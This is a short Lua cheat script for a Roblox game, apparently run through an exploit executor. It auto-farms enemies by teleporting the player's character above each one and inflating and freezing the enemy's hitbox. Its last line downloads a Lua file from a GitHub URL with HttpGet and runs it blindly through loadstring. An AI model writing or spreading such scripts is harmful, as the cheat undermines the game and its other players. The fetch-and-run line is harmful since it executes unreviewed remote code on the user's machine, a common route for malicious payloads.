local plr = game.Players.LocalPlayer
local char = plr.Character
local map = Workspace.Map
local e = Workspace.Enemies

local data = plr:FindFirstChild("Data")
local combat = plr.Backpack:FindFirstChild("Dragon Talon")

local root = char.PrimaryPart

keypress(0x4a)
plr.Character.Humanoid:EquipTool(combat)

for i,v in pairs(e:GetChildren()) do
    local eroot = v.PrimaryPart

    while task.wait(2) do
        root.Anchored = false
        local track = game.TweenService:Create(root,TweenInfo.new(),{CFrame = v:GetPivot() * CFrame.new(0,15,0)})
        track:Play()
        track.Completed:Wait()
        root.Anchored = true
        eroot.Size = Vector3.new(25,25,25)
        eroot.Anchored = true
        v.Humanoid.Died:Wait()
    end
end

loadstring(game:HttpGet("https://raw.githubusercontent.com/lagbackisasussydog/waitun/refs/heads/main/click.lua"))()
